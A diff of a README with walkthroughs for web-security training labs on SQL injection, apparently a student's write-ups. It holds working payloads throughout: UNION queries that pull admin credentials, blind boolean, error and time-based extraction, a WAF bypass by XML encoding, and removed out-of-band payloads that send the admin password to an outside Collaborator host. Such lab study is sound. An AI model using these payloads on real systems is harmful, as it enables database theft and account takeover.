@@ -4,157 +4,142 @@
 
 </div>
 
-## **Retrieving hidden data**
+## **UNION attacks**
 
-### **Lab 1:** SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+### **Lab:** SQL injection UNION attack, retrieving data from other tables
 
-**Solution:** Set the category parameter to ` ` or 1=1 -- `. 
+**Goal:** Login as administrator user
 
-**Solution script:** [Lab1.py](./lab1.py)
+**The lab provide:** A table called user, with collums call username and password
 
-## **Subverting application logic**
+**Solution:** 
 
-### **Lab 2:** SQL injection vulnerability allowing login bypass
+1.    The website has endpoint /filter that has parameter `category `which filter items based on category. We try adding `'` after the value of the category parameter and getting error. This indicates that this website is vulnerable to SQL injection.
 
-**Solution:** In the login page, give `username = administrator' --`. 
+![](./img/lab1/1.png)
 
-**Solution script:** [Lab2.py](./lab2.py)
+2.  Determine the number of coLumn that are being returned by the query:
 
-## **SQL injection UNION attacks**
+We know that this website is vulnerable. We will use the query `order by` with number. We see that `' order by 2 -- -` still work but with `' order by 3 -- -`, the website return error. So the number of column is 2.
 
-### **Lab 3:** SQL injection UNION attack, determining the number of columns returned by the query
+![](./img/lab1/2.png)
 
-**Solution:** Set the category parameter to ` ' UNION Select null,null,null -- `. 
+![](./img/lab1/3.png)
 
-**Solution script:** [UNIONLab1.py](./UNIONLab1.py)
+3.  Using the query `' Union select 'a', 'a' -- -`, we have verified that both column contain text data.
 
-### **Lab 4:** SQL injection UNION attack, finding a column containing text
+![](./img/lab1/4.png)
 
-**Solution:** Set the category parameter to ` ' UNION Select null,null,'target string' -- `. 
+4.  Using the query `' Union select username,password from users where username='administrator' -- -`, we will get password of the user administrator.
 
-**Solution script:** [UNIONLab2.py](./UNIONLab2.py). In the script, I have tried all possible combination of (null, null, target string) until the lab is solved.
+![](./img/lab1/5.png)
 
-### **Lab 5:** SQL injection UNION attack, retrieving data from other tables
+5.  Login as administrator to solve the lab
 
-**Solution:** Set the category parameter to ` ' UNION Select username,password from users where username = 'administrator' -- `. You will get the password of user 'administrator'. Finally, login as administrator to solve the lab. 
+![](./img/lab1/6.png)
 
 **Solution script:** [UNIONLab3.py](./UNIONLab3.py)
 
-### **Lab 6:** SQL injection UNION attack, retrieving multiple values in a single column
 
-**Solution:** Set the category parameter to ` ' UNION Select null, username || '~' || password from users where username = 'administrator' -- `. You will get the password of user 'administrator'. Finally, login as administrator to solve the lab. 
-
-**Solution script:** [UNIONLab4.py](./UNIONLab4.py)
 
 ## **Examining the database**
 
-### **Lab 7:** SQL injection attack, querying the database type and version on Oracle
-
-**Solution:** Set the category parameter to ` ' UNION Select null,banner v$version where banner like 'Oracle%' -- `.
-
-**Solution script:** [ExaminingLab1.py](./ExaminingLab1.py)
-
-### **Lab 8:** SQL injection attack, querying the database type and version on MySQL and Microsoft
-
-**Solution:** Set the category parameter to ` ' UNION Select @@version,null # `.
-
-**Solution script:** [ExaminingLab2.py](./ExaminingLab2.py)
-
 ### **Lab 9:** SQL injection attack, listing the database contents on non-Oracle databases
 
-**Solution:** Firstly, set the category parameter to ` ' UNION Select table_name,null from information_schema.tables where table_name like 'users_%'-- - ` to get the table name. Then, set the category parameter to ` ' UNION Select column_name,null from information_schema.columns where table_name = '(your table_name)' -- - ` to get all columns from that table. When you have the table with all columns, set the category parameter to ` ' UNION Select (your username columns),(your password column) from (your table_name) where (your username columns) = 'administrator' -- - ` to get the credential of the administrator.
+**Goal:** Login as administrator user
+
+**The lab provide:** A table that holds usernames and passwords, so we need to find out the table name and the column name.
+
+**Solution:**
+
+1.    The website has endpoint /filter that has parameter `category `which filter items based on category. We try adding `'` after the value of the category parameter and getting error. This indicates that this website is vulnerable to SQL injection.
+
+![](./img/lab2/1.png)
+
+2.  Determine the number of coLumn that are being returned by the query:
+
+We know that this website is vulnerable. We will use the query `order by` with number. We see that `' order by 2 -- -` still work but with `' order by 3 -- -`, the website return error. So the number of column is 2.
+
+![](./img/lab2/2.png)
+
+![](./img/lab2/3.png)
+
+3.  Using the query `' Union select 'a', 'a' -- -`, we have verified that both column contain text data.
+
+![](./img/lab1/4.png)
+
+4.  Determine the database version
+
+Using queries from different databases, we see that the database is postgreSQL (query: Union select version(), null -- -)
+
+![](./img/lab2/5.png)
+
+5.  With PostgreSQL, use the query `' union select table_name, null from information_schema.tables -- -`. Looking at the result, we see that there is a table named users_muqwsh
+
+![](./img/lab2/6.png)
+
+6.  Use the query `' union select column_name, null from information_schema.columns where table_name='users_muqwsh' -- -` to get the columns name. Looking at the result, we see that this table has 2 columns: username_vdoeck and password_bnwwyr
+
+![](./img/lab2/7.png)
+
+7.  Using the query `' Union select username_vdoeck,password_bnwwyr from users_muqwsh where username_vdoeck='administrator' -- -`, we will get password of the user administrator.
+
+![](./img/lab2/8.png)
+
+8.  Login as administrator to solve the lab
+
+![](./img/lab2/9.png)
 
 **Solution script:** [ExaminingLab3.py](./ExaminingLab3.py)
 
-### **Lab 10:** SQL injection attack, listing the database contents on Oracle
-
-**Solution:** Firstly, set the category parameter to ` ' UNION Select table_name,null from all_tables where table_name like 'USERS_%'-- - ` to get the table name. Then, set the category parameter to ` ' UNION Select column_name,null from all_tab_columns where table_name = '(your table_name)' -- - ` to get all columns from that table. When you have the table with all columns, set the category parameter to ` ' UNION Select (your username columns),(your password column) from (your table_name) where (your username columns) = 'administrator' -- - ` to get the credential of the administrator.
-
-**Solution script:** [ExaminingLab4.py](./ExaminingLab4.py)
-
 ## **Blind SQL Injection**
 
-### **Lab 11:** Blind SQL injection with conditional responses
+### **Lab:** Blind SQL injection with conditional responses
 
-**Solution:** Modify the TrackingId cookie. Using brute force to get the length of the password by changing TrackingId to: 
-```python
-"Trackingid' AND (SELECT LENGTH(password) FROM users where username = 'administrator')='{}' -- -".format(password_len)
-```
-When password_len = 20, the message 'Welcome back' appear in the respond, so the length of the password is 20. Then, retrieve the password by changing TrackingId to:
-```python
-"Trackingid' AND (SELECT SUBSTR(password, {}, 1) FROM users where username = 'administrator')='{}' -- -".format(len(password) + 1, char)
-```
-char is chosen from the charset which contain lowercase letter and number. 
+**Goal:** Login as administrator user
+
+**The lab provide:** The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. The database contains a different table called users, with columns called username and password
+
+**Solution:** 
+
+1.  Since this website use SQL for tracking cookie. We will try modify it. We will call the initial value of the tracking cookie 'xyz' for demonstration purpose. Setting the tracking cookie to `xyz'`, we see that the 'Welcome back!' message is not appeared. This is not a normal behavior of this website. Therefore, the tracking cookie may be vulnerable to SQL injection.
+
+![](./img/lab3/1.png)
+
+2.  Exploring further by setting the tracking cookie to `xyz' and '1'='1' -- -` and `xyz' and '1'='2' -- -`. We see that with the `'1' = '1'`, the 'Welcome back!' message is appeared while `'1' = '2'`, the 'Welcome back!' message is not appeared. Therefore, we are certain that the tracking cookie is vulnerable to SQL injection, specifically Blind SQL Injection with conditional responses. If tracking id exsit, the 'Welcome back!' message is appeared. If tracking id does not exsit, the 'Welcome back!' message is not appeared.
+
+![](./img/lab3/2.png)
+
+![](./img/lab3/3.png)
+
+3.  Confirm that there is a table named users by setting the tracking cookie to `xyz' and (select 'l' from users LIMIT 1)='l' -- -`. the 'Welcome back!' message is appeared
+
+![](./img/lab3/4.png)
+
+4.  Confirm that there is a user named administrator by setting the tracking cookie to `xyz' and (select 'l' from users where username='administrator' LIMIT 1)='l' -- -`. the 'Welcome back!' message is appeared
+
+![](./img/lab3/5.png)
+
+5.  We will brute force for the length of the password by setting the tracking cookie to `xyz' and (select length(password) from users where username='administrator' LIMIT 1)=1 -- -`, then `... LIMIT 1)=2 -- -` and so on. Eventually, we get the length of the password is 20
+
+![](./img/lab3/6.png)
+
+6.  We will bruteforce for the password using the burp intruder
+
+![](./img/lab3/7.png)
+
+![](./img/lab3/8.png)
+
+![](./img/lab3/9.png)
+
+After bruteforcing, we get the password of the administrator based on the length of the response
+
+![](./img/lab3/10.png)
+
+After reordering, the password is: 11jkyx54o37my7k5xfyu
+
+7\.  Login as administrator to solve the lab
+
+![](./img/lab3/11.png)
 
 **Solution script:** [BlindLab1.py](./BlindLab1.py)
-
-### **Lab 12:** Blind SQL injection with conditional errors
-
-**Solution:** Similar to Lab 11, however, we rely on whether the query trigger an error or not. The query we use is:
-```python
-"Trackingid'||(SELECT case when (LENGTH(password)={}) then (1/0) else null end from users where username='administrator')||'".format(password_len)
-```
-```python
-"Trackingid' ||(SELECT case when (SUBSTR(password,{},1)='{}') then (1/0) else null end from users where username='administrator')||'".format(len(password) + 1, char)
-```
-
-**Solution script:** [BlindLab2.py](./BlindLab2.py)
-
-### **Lab 13:** Blind SQL injection with conditional errors
-
-**Solution:** Change the trackingId of the cookies to `Trackingid || pg_sleep(10) -- -`.
-
- **Solution script:** [BlindLab3.py](./BlindLab3.py)
-
-### **Lab 14:** Blind SQL injection with time delays and information retrieval
-
-**Solution:** Similar to Lab 12, however, we rely on the time server take to respond . The query we use is:
-```python
-"Trackingid'||(SELECT case when (LENGTH(password)={}) then (pg_sleep(10)) else (pg_sleep(0)) end from users where username='administrator')||'".format(password_len)
-```
-```python
-"Trackingid' ||(SELECT case when (SUBSTR(password,{},1)='{}') then (pg_sleep(10)) else (pg_sleep(0)) end from users where username='administrator')||'".format(len(password) + 1, char)
-```
-
-**Solution script:** [BlindLab4.py](./BlindLab4.py)
-
-### **Lab 15:** Blind SQL injection with out-of-band interaction
-
-**Solution:** Change the trackingId of the cookies to:
-```python
-'''Trackingid' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "{}"> %remote;]>'),'/l') FROM dual-- -'''.format(burp_client)
-```
-Then URLEncoded them.
-
-**Solution script:** [BlindLab5.py](./BlindLab5.py)
-
-### **Lab 16:** Blind SQL injection with out-of-band data exfiltration
-
-**Solution:** Change the trackingId of the cookies to:
-```python
-'''Trackingid' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "'||(Select password from users where username = 'administrator')||'.{}"> %remote;]>'),'/l') FROM dual-- -'''.format(burp_client)
-```
-URLEncode them, then go to the Collaborator tab and get the password
-
-**Solution script:** [BlindLab6.py](./BlindLab6.py)
-
-## **SQL injection in different contexts**
-
-### **Lab 17:** SQL injection with filter bypass via XML encoding
-
-**Solution:** In the post request to endpoint /product/stock, use this xml
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<stockCheck>
-    <productId>1</productId>
-    <storeId>2 union select username || '~' || password from users where username = 'administrator'</storeId>
-</stockCheck>
-```
-Then use html_encode to bypass the WAF
-```python
-def html_encode(string):
-    return ''.join(['&#{0};'.format(ord(char)) for char in string])
-```
-You will get the password of the administrator user.
-
-**Solution script:** [XMLLab.py](./XMLLab.py)
